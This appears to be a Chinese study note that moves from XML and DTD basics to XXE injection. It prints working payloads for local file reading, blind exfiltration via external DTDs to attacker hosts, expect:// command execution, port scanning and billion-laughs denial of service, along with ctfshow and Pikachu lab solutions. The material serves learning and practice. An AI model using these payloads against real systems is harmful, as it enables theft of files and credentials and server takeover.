与 元素属性： 1234&lt;note day=&quot;10&quot; month=&quot;01&quot; year=&quot;2008&quot;to=&quot;Tove&quot; from=&quot;Jani&quot; heading=&quot;Reminder&quot;body=&quot;Don&#x27;t forget me this weekend!&quot;&gt;&lt;/note&gt; 12345#缺点：属性不能包含多个值不能包含树结构不容易扩展难以阅读 元素： 1234567891011&lt;note&gt; &lt;date&gt; &lt;day&gt;10&lt;/day&gt; &lt;month&gt;01&lt;/month&gt; &lt;year&gt;2008&lt;/year&gt; &lt;/date&gt; &lt;to&gt;Tove&lt;/to&gt; &lt;from&gt;Jani&lt;/from&gt; &lt;heading&gt;Reminder&lt;/heading&gt; &lt;body&gt;Don&#x27;t forget me this weekend!&lt;body&gt;&lt;/note&gt; 建议：使用元素 特别的：ID属性，便于访问XML元素 1234567891011121314&lt;messages&gt;&lt;note id=&quot;p501&quot;&gt; &lt;to&gt;Tove&lt;/to&gt; &lt;from&gt;Jani&lt;/from&gt; &lt;heading&gt;Reminder&lt;/heading&gt; &lt;body&gt;Don&#x27;t forget me this weekend!&lt;/body&gt;&lt;/note&gt;&lt;note id=&quot;p502&quot;&gt; &lt;to&gt;Jani&lt;/to&gt; &lt;from&gt;Tove&lt;/from&gt; &lt;heading&gt;Re: Reminder&lt;/heading&gt; &lt;body&gt;I will not!&lt;/body&gt;&lt;/note&gt;&lt;/messages&gt; 1.7 XML在浏览器中的显示显示：单独的 XML 文档不会携带有关如何显示数据的信息，直接将XML的源码显示出来。 方法： 链接到CSS文件 1&lt;?xml-stylesheet type=&quot;text/css&quot; href=&quot;cd_catalog.css&quot;?&gt; 使用 CSS 格式化 XML 不是常用的方法 使用 XSLT，把 XML 文档转换成 HTML 格式显示 XSLT 是首选的 XML 样式表语言，当浏览器读取 XML 文件时，XSLT 转换是由浏览器完成的 使用 XSLT 来转换 XML 时，不同的浏览器可能会产生不同结果。为了减少这种问题，可以在服务器上进行 XSLT 转换。 1.8 XML 的解析所有现代浏览器都有内建的 XML 解析器。 XML 解析器把 XML 文档转换为 XML DOM 对象 - 可通过 JavaScript 操作的对象。 XML DOM : XML DOM（XML Document Object Model）定义了访问和操作 XML 文档的标准方法，把 XML 文档作为树结构来查看。 通过 DOM 树可以 访问 和 修改或删除 它们的内容，并 创建新的元素。 有两种基本的 XML 解析器类型： 基于树的解析器：这种解析器把 XML 文档转换为树型结构。它分析整篇文档，并提供了对树中元素的访问，例如文档对象模型 (DOM)。 基于事件的解析器：将 XML 文档视为一系列的事件。当某个具体的事件发生时，解析器会调用函数来处理。 DOM 解析器是基于树的解析器。 1.8.1 PHP XML DOM内建的 DOM 解析器使在 PHP 中处理 XML 文档成为可能。 也就是说DOM XML 解析器函数是 PHP 核心的组成部分。无需安装就可以使用这些函数。 示例： 1#xml：&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [&lt;!ELEMENT message (hair,country,eye,body)&gt;&lt;!ELEMENT hair (#PCDATA)&gt;&lt;!ELEMENT country (#PCDATA)&gt;&lt;!ELEMENT eye (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt; ]&gt;&lt;message&gt; &lt;hair&gt;Black&lt;/hair&gt; &lt;country&gt;China&lt;/country&gt; &lt;eye&gt;big&lt;/eye&gt; &lt;body&gt;You are handsome!&lt;/body&gt;&lt;/message&gt; 1#php:直接输出&lt;?php$xmlDoc = new DOMDocument();#创建DOMDocument对象$xmlDoc-&gt;load(&quot;test.xml&quot;);#将test.xml加载进去print $xmlDoc-&gt;saveXML();#把内部 XML 文档放入一个字符串，用于输出?&gt; 1#php:遍历 XML&lt;?php$xmlDoc = new DOMDocument();$xmlDoc-&gt;load(&quot;test.xml&quot;);$x = $xmlDoc-&gt;documentElement;foreach ($x-&gt;childNodes AS $item)&#123; print $item-&gt;nodeName . &quot; = &quot; . $item-&gt;nodeValue . &quot;&lt;br&gt;&quot;;&#125;?&gt; 1#php:SimpleXML&lt;?php$xml=simplexml_load_file(&quot;test.xml&quot;);print_r($xml);?&gt; 1&lt;?php$xml=simplexml_load_file(&quot;test.xml&quot;);echo $xml-&gt;hair . &quot;&lt;br&gt;&quot;;echo $xml-&gt;country . &quot;&lt;br&gt;&quot;;echo $xml-&gt;eye . &quot;&lt;br&gt;&quot;;echo $xml-&gt;body;?&gt; 1&lt;?php$xml=simplexml_load_file(&quot;test.xml&quot;);echo $xml-&gt;getName() . &quot;&lt;br&gt;&quot;; foreach($xml-&gt;children() as $child)&#123; echo $child-&gt;getName() . &quot;: &quot; . $child . &quot;&lt;br&gt;&quot;;&#125;?&gt; XML DOM 教程 1.9 文档结构 — 树结构 XML声明 DTD文档类型定义（可选） 文档元素 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;note&gt; #根元素，与其它元素之间是 父子关系;各个子元素之间：同胞关系&lt;to&gt;Tove&lt;/to&gt;#四个子元素：to,from,heading,body&lt;from&gt;Jani&lt;/from&gt;&lt;heading&gt;Reminder&lt;/heading&gt;&lt;body&gt;Don&#x27;t forget me this weekend!&lt;/body&gt;&lt;/note&gt; 1.9.1 XML声明1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;#XML声明: 用于告诉浏览器这是一个xml文档；当看到该声明时，浏览器会自动调用 xml解释器 运行该xml文档#version属性：用于说明当前xml文档的版本，属性必须#encodeing属性：用于说明当前xml文档使用的字符编码集，xml解析器会使用这个编码来解析xml文档，属性可选 1.9.2 DTD文档类型定义（可选）DTD(Document Type Definition) 即 文档类型定义，作用是定义 XML 文档的合法构建模块，这个模块里面 定义了用户自己创建的根元素以及对应的子元素和根元素的合法子元素和属性，那么文档中的所有元素都必须以该DTD为模板, 用于对XML的元素的内容进行相应的规范化。 作用：验证你的XML 格式：定义元素 1&lt;!DOCTYPE note [&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt;]&gt; 注：W3C 支持一种基于 XML 的 DTD 代替者，它名为 XML Schema XML Schema 菜鸟教程 使用 XML Schema 攻击 定义实体： 除了在 DTD 中定义 元素（其实就是对应 XML 中的标签）以外，我们还能在 DTD 中 定义实体 (对应XML 标签中的内容) 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe &quot;test&quot;&gt;]&gt;&lt;creds&gt; &lt;user&gt;&amp;xxe;&lt;/user&gt; &lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt; 实体可以从 外部的 dtd 文件 中引用 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt;&lt;creds&gt; &lt;user&gt;&amp;xxe;&lt;/user&gt; &lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;dtd:&lt;!ENTITY xxe SYSTEM &quot;file:///d://test1.txt&quot;&gt; 声明方式 内部声明 1&lt;!DOCTYPE 根元素 [元素声明]&gt;#例如&lt;!DOCTYPE message [&lt;!ELEMENT message (hair,country,eye,body)&gt;&lt;!ELEMENT hair (#PCDATA)&gt;&lt;!ELEMENT country (#PCDATA)&gt;&lt;!ELEMENT eye (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt; ]&gt; 外部声明 1&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt; 1#例如：&lt;!DOCTYPE message SYSTEM &quot;message.dtd&quot;&gt;#message.dtd&lt;!ELEMENT message (hair,country,eye,body)&gt;&lt;!ELEMENT hair (#PCDATA)&gt;&lt;!ELEMENT country (#PCDATA)&gt;&lt;!ELEMENT eye (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt; 二、DTD2.1 元素声明 普通声明 1&lt;!ELEMENT element-name category&gt;或&lt;!ELEMENT element-name (element-content)&gt; 空元素 1&lt;!ELEMENT element-name EMPTY&gt;实例:&lt;!ELEMENT br EMPTY&gt;XML example:&lt;br /&gt; PCDATA元素 1&lt;!ELEMENT element-name (#PCDATA)&gt; 带有任何内容的元素 1&lt;!ELEMENT element-name ANY&gt; 带有子元素的声明 1&lt;!ELEMENT element-name (child1)&gt;&lt;!ELEMENT element-name (child1,child2,...)&gt; 1例子：要按顺序&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt; 只出现一次的元素 1&lt;!ELEMENT element-name (child-name)&gt; 最少出现一次的元素 1&lt;!ELEMENT element-name (child-name+)&gt; 出现零次或多次 1&lt;!ELEMENT element-name (child-name*)&gt; 出现零次或一次 1&lt;!ELEMENT element-name (child-name?)&gt; 其它 1&lt;!ELEMENT note (to,from,header,(message|body))&gt; &lt;!ELEMENT note (#PCDATA|to|from|header|message)*&gt; 2.2 属性声明1&lt;!ATTLIST element-name attribute-name attribute-type attribute-value&gt; 属性类型 2.3 实体前面了解到DTD是用来定义XML文档当中的元素的，用于规范他们，实际上，它还 用于定义引用普通文本或特殊字符的快捷方式的变量（即 实体）。 实体其实可以看成一个变量，到时候我们可以在 XML 中通过 &amp; 符号进行引用。 2.3.1 普通实体 内部声明 1&lt;!ENTITY entity-name &quot;entity-value&quot;&gt; 1#实体的引用：&amp;，实体名称，分号 1例子：&lt;!ENTITY day &quot;10&quot;&gt; XML:&lt;day&gt;&amp;day;&lt;/day&gt; 外部声明 1&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;&lt;!ENTITY 实体名称 PUBLIC &quot;DTD标识名&quot; &quot;公用DTD的URI&quot;区别: PUBLIC是指公用DTD,其是某个权威机构制定，供特定行业或公司. SYSTEM是指该外部DTD文件是私有的，即我们自己创建的，没有公开发行，只是个人或在公司内部或者几个合作单位之间使用. 公用DTD使用PUBLIC代替了原来的SYSTEM，并增加了DTD标识名。 1例子：test1.dtd:&lt;!ENTITY test SYSTEM &quot;file:///d://test1.txt&quot;&gt;XML：&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE test SYSTEM &quot;file:///d://test1.dtd&quot;&gt;&lt;author&gt;&amp;test;&lt;/author&gt; 2.3.2 参数实体仅仅在DTD中使用的解析实体 1#内部声明: ENTITY关键字、百分号、名称和替换值&lt;!ENTITY % 实体名称 &quot;实体值&quot;&gt;#外部声明&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;%实体名;#实体的引用&lt;x&gt;%实体名;&lt;/x&gt; 注： %两边的空格不能少 参数实体不能像普通实体那样在xml文档内容中进行引用，它的引用范围只在 当前xml文件的DTD声明 中，或者是 当前的DTD文件 中 在DTD中，所有参数实体必须在引用之前进行声明 参数实体对 无回显XXE 的利用 起了至关重要的作用 XML Schema 菜鸟教程 三、XXE**XML External Entity — XML外部实体注入漏洞 ** , 发生在 应用程序解析XML输入时，没有禁止外部实体的加载 （ 与该选项有关libxml_disable_entity_loader (false);），导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击 等危害。 概述：攻击者通过 向服务器注入指定的xml实体内容 ，从而让服务器按照指定的配置进行执行,导致问题。也就是说服务端 接收和解析 了来自用户端的xml数据,而又没有做严格的安全控制,从而导致 xml外部实体注入。 产生点： 文档类型定义时，可以引用外部的 DTD 文件 XML解析器解析外部实体时支持多种协议（file :///, http:// 等） 利用点： ​ 通过构造恶意的外部实体，当XML解析器解析了我们所包含的恶意实体时便会触发漏洞 1现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的,从而也就直接避免了这个漏洞。#以PHP为例,在PHP里面解析xml用的是libxml，其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。 危害 文件读取 RCE执行 内网攻击 Dos攻击 3.1 利用3.1.1 有回显通过正常的回显将 外部实体 中的内容读取出来 测试：1&lt;?php libxml_disable_entity_loader (false);//禁用加载外部实体的功能，禁用（TRUE）或启用（FALSE）libxml扩展（如DOM，XMLWriter和XMLReader）来加载外部实体 $xmlfile = file_get_contents(&#x27;php://input&#x27;); $dom = new DOMDocument();//创建一个DOM对象 $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); //加载XML//LIBXML_NOENT 替代实体//LIBXML_DTDLOAD 加载外部子集 $creds = simplexml_import_dom($dom);//该函数把 DOM 节点转换为 SimpleXMLElement 对象 echo $creds;?&gt; 引入内部实体 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ENTITY test SYSTEM &quot;file:///c:/windows/system32/drivers/etc/hosts&quot;&gt; ]&gt; &lt;creds&gt;&amp;test;&lt;/creds&gt; 引入外部参数实体 —– 题目当中经常使用的一个点 1&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY % file SYSTEM &quot;http://vps-ip/hack.dtd&quot;&gt; %file;]&gt;&lt;test&gt;&amp;hhh;&lt;/test&gt; 1hack.dtd&lt;!ENTITY hhh SYSTEM &#x27;file:///etc/passwd&#x27;&gt; 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ENTITY test SYSTEM &quot;file:///d://222.txt&quot;&gt; ]&gt; &lt;creds&gt;&amp;test;&lt;/creds&gt; 当文件内容当中包含 &lt; 和 &amp; 符号时，就会出现报错 php://filter之前最常出镜的地方是XXE。由于XXE漏洞的特殊性，我们在读取HTML、PHP等文件时可能会抛出此类错误parser error : StartTag: invalid element name 。其原因是，PHP是基于标签的脚本语言，&lt;?php ... ?&gt;这个语法也与XML相符合，所以在解析XML的时候会被误认为是XML，而其中内容（比如特殊字符）又有可能和标准XML冲突，所以导致了出错。 解决：使用 CDATA 想法一： 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ENTITY test SYSTEM &quot;file:///d:/222.txt&quot;&gt; ]&gt; &lt;creds&gt;&lt;![CDATA[&amp;test;]]&gt;&lt;/creds&gt;#错误：这只会将 &amp;test; 原模原样的输出 想法二：直接在 xml当中进行拼接 —- 普通实体 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ENTITY start &quot;&lt;![CDATA[&quot;&gt;&lt;!ENTITY test SYSTEM &quot;file:///d:/222.txt&quot;&gt; &lt;!ENTITY end &quot;]]&gt;&quot;&gt;]&gt; &lt;creds&gt;&amp;start;&amp;test;&amp;end;&lt;/creds&gt;#依旧是大量的报错 想法三：参数实体 在 内部DTD拼接 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;&lt;!ENTITY % test SYSTEM &quot;file:///d:/222.txt&quot;&gt; &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;&lt;!ENTITY all &quot;%start;%test;%end;&quot;&gt;]&gt; &lt;creds&gt;&amp;all;&lt;/creds&gt;#仍旧有报错 根据XML规范所描述：“在DTD内部子集中的参数实体调用，不能混掺到标记语中” ; 也就是说参数实体不能在内部DTD中进行拼接，但是XML规范还声明了一点：“外部参数实体不受此限制”，这就告诉我们可以使用外部的DTD来构造payload，将我们的CDATA内容拼接起来. 想法四：使用外部参数实体 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;&lt;!ENTITY % test SYSTEM &quot;file:///d:/222.txt&quot;&gt; &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;file:///d:/xxe.dtd&quot;&gt;%dtd; ]&gt;&lt;creds&gt;&amp;all;&lt;/creds&gt;xxe.dtd:&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!ENTITY all &quot;%start;%test;%end;&quot;&gt; 可成功显示出 &amp; &lt; 符号 php伪协议那么，为了读取包含有敏感信息的PHP等源文件，我们就要先将“可能引发冲突的PHP代码”编码一遍，这里就会用到php://filter。 php://filter是PHP语言中特有的协议流 https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=d:/222.txt&quot;&gt; ]&gt;&lt;creds&gt;&amp;test;&lt;/creds&gt; 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ENTITY test SYSTEM &quot;data://text/plain;base64,&quot;&gt; ]&gt;&lt;creds&gt;&amp;test;&lt;/creds&gt; 3.1.2 无回显利用参数实体将本地文件内容读出来后，作为URL中的参数向其指定的服务器发起请求，然后在其指定服务器的日志中读出文件内容 测试1&lt;?phplibxml_disable_entity_loader (false);$xmlfile = file_get_contents(&#x27;php://input&#x27;);$dom = new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); //未输出?&gt; Payload: 1&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE convert [ &lt;!ENTITY % test SYSTEM &quot;http://xxe/xxe2.dtd&quot;&gt;%test;%int;%send;]&gt; 1xxe2.dtd:&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///d:/222.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://xxe:9999?p=%file;&#x27;&gt;&quot;&gt; 日志的读取/文件的接收代码 或者是 开启端口监听 开启端口监听 1python2语法：python -m SimpleHTTPServer portpython3语法：python -m http.server port 说明： 我们总共连续调用了三个参数实体，%test;%int;%send; 首先调用%test去请求远程服务器上的xxe2.dtd，相当于将xxe2.dtd包含进来，然后调用 %int，在xxe2.dtd文件当中将会调用%file，%file将会获取服务器上的敏感文件222.txt，然后将%file（敏感文件当中的内容）写入%send当中(由于实体的值中不能有 %, 所以将其转成html实体编码 &amp;#37;)； 最后调用 %send ，就会将我们读取到的数据发送到远程 vps上，也就实现了 外带数据 的效果，解决了xxe无回显的问题。 引入服务器文件 1&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % remote SYSTEM &quot;http://blog.szfszf.top/xml.dtd&quot;&gt; &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt; %remote; %send;]&gt;&lt;message&gt;1234&lt;/message&gt; 1xml.dtd:&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;file:///hhhhhhh/%file;&#x27;&gt;&quot;&gt;%start; 引入本地文件 1&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % remote SYSTEM &quot;/usr/share/yelp/dtd/docbookx.dtd&quot;&gt; &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt; &lt;!ENTITY % ISOamso &#x27; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;file://hhhhhhhh/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;send; &#x27;&gt; %remote;]&gt;&lt;message&gt;1234&lt;/message&gt; 嵌套参数实体 1&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt; &lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://myip/?%file;&#x27;&gt;&quot;&gt; %start; %send;]&gt;&lt;message&gt;10&lt;/message&gt; 三层嵌套参数实体 1&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ELEMENT message ANY&gt; &lt;!ENTITY % para1 SYSTEM &quot;file:///flag&quot;&gt; &lt;!ENTITY % para &#x27; &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt; &amp;#x25;para2; &#x27;&gt; %para;]&gt;&lt;message&gt;10&lt;/message&gt; 更多绕过姿势 HTTP 内网主机探测 – 端口扫描1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE data SYSTEM &quot;http://127.0.0.1:8080/&quot; [ ]&gt;&lt;data&gt;4&lt;/data&gt; 可结合 burp 爆破模块 RCE : PHP expect模块开启条件：安装 expect扩展的情况下，在PHP环境当中执行系统命令 1&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ELEMENT ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt; 1&#123;&quot;error&quot;: &quot;no results for description uid=0(root) gid=0(root) groups=0(root)... Dos攻击1&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE lolz [ &lt;!ENTITY lol &quot;lol&quot;&gt; &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt; &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt; &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt; &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt; &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt; &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt; &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt; &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt; ]&gt;&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt; 此测试可以在内存中将小型 XML 文档扩展到超过 3GB 而使服务器崩溃。 UNIX 下： 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;file:///dev/random&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt; 如果 XML 解析器尝试使用/dev/random文件中的内容来替代实体，则此示例会使服务器（使用 UNIX 系统）崩溃。 3.1.3 Pikachu读取文件（敏感） 测试环境：Pikachu 有回显 直接读取本地文件进行测验 1&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;file:///d:/test.txt&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt; 1&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;file:///c:/Windows/system32/drivers/etc/hosts&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt; 引入外部实体 1&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY % file SYSTEM &quot;http://xxe/1.dtd&quot;&gt;%file;]&gt;&lt;x&gt;&amp;send;&lt;/x&gt; 11.dtd:&lt;!ENTITY send SYSTEM &quot;file:///d:/test.txt&quot;&gt; php伪协议 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=d:/222.txt&quot;&gt; ]&gt;&lt;creds&gt;&amp;test;&lt;/creds&gt; 利用php扩展 expect 执行系统命令 — RCE 1&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;expect://id&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/xxe&gt; 无回显 Payload1: 1&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=d:/test.txt&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://xxe/4.dtd&quot;&gt;%dtd;%send;]&gt; 14.dtd:&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://xxe:2222/?data=%file;&#x27;&gt;&quot;&gt;%payload; Payload2: 1&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE convert [ &lt;!ENTITY % test SYSTEM &quot;http://xxe/xxe2.dtd&quot;&gt;%test;%int;%send;]&gt; 1xxe2.dtd:&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///d:/222.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://xxe:9999/?p=%file;&#x27;&gt;&quot;&gt; 端口监听 日志的读取/文件的接收代码 或者是 开启端口监听 日志查看 环境：win-2003 1&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=d:/test.txt&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://192.168.158.115/xxe/3.dtd&quot;&gt;%dtd;%send;]&gt; 13.dtd:&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://xxe:2222/?data=%file;&#x27;&gt;&quot;&gt;%payload; 3.1.4 xxe-lab1&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;file:///c:/Windows/system32/drivers/etc/hosts&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt; 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=d:/222.txt&quot;&gt; ]&gt;&lt;user&gt;&lt;username&gt;&amp;test;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt; 3.1.5 xlsx 文件攻击xlsx 文件上传 3.2 绕过方式参考 https://xz.aliyun.com/t/4059 3.3 检测 工具 人工 数据格式类型判断 Content-Type值判断 text/xml application/xml 盲猜：更改Content-Type值尝试 3.4 工具XXEinjector(Ruby) 安装 使用 3.5 练题3.5.1 CTF show373 1error_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#x27;php://input&#x27;);if(isset($xmlfile))&#123; $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); $ctfshow = $creds-&gt;ctfshow; echo $ctfshow;&#125;highlight_file(__FILE__); 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE user [&lt;!ENTITY all SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;user&gt;&lt;ctfshow&gt;&amp;all;&lt;/ctfshow&gt;&lt;/user&gt; 374 1error_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#x27;php://input&#x27;);if(isset($xmlfile))&#123; $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);&#125;highlight_file(__FILE__); 1&lt;!DOCTYPE test [&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag&quot;&gt;&lt;!ENTITY % hack SYSTEM &quot;http://xxe/test.dtd&quot;&gt;%hack;%dtd;%xxe; 1test.dtd:&lt;!ENTITY % dtd &quot;&lt;!ENTITY &amp;#x25; xxe SYSTEM &#x27;http://xxe:3333/%file;&#x27;&gt; &quot;&gt;%dtd;%xxe; 引用%hack后调用外部文件，后调用%dtd引入嵌套的payload后引用%xxe接收数据 监听端口 1python2语法：python -m SimpleHTTPServer python3语法：python -m http.server 375 1error_reporting(0); libxml_disable_entity_loader(false); 